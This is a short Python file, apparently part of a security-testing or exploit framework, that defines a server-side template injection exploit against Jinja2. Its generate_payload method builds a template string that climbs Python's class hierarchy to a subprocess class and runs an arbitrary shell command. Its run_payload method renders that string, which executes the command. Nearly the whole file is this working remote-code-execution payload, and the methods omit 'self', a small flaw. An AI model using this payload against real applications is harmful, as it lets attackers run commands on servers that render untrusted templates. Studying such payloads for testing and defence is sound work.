from .execution_base import Exploit


class ServerSideTemplateInjectionExploit(Exploit):
    category_name = "Server-Side Template Injection Exploit"

class JinjaTemplateExploit(ServerSideTemplateInjectionExploit):
    vulnerable_function = "jinja2.Template"
    def generate_payload(command: str) -> str:
        # the index of the class can vary!
        return f"{{{{''.__class__.__mro__[1].__subclasses__()[426]('{command}',shell=True,stdout=-1).communicate()}}}}"

    def run_payload(payload: str) -> None:
        import jinja2
        template = jinja2.Template(payload)
        res = template.render()
        print(res)
        return res
